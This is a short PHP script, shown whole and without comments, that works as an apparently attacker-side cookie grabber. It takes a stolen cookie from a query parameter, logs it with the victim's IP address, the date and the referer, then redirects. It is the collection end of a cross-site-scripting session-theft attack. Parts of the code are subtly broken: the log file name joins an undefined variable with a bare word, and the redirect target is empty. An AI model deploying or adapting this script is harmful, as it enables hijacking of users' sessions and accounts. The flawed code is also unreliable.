<?php
    $cookie = $_GET['c'];
    $ip = getenv('REMOTE_ADDR');
    $date = date('j F, Y, g:i a');
    $referer = getenv('HTTP_REFERER');
    $out = 'Cookie: ' .$cookie . "\n";
    $out = $out . 'IP: ' . $ip . "\n";
    $out = $out . 'Date: ' . $date . "\n";
    $out = $out . 'Referer: ' . $referer . "\n";
    $fp = fopen($log.ini, 'a');
    fwrite($fp, $out);
    fclose($fp);
    header("Location: ");

?>

<HTML></HTML>
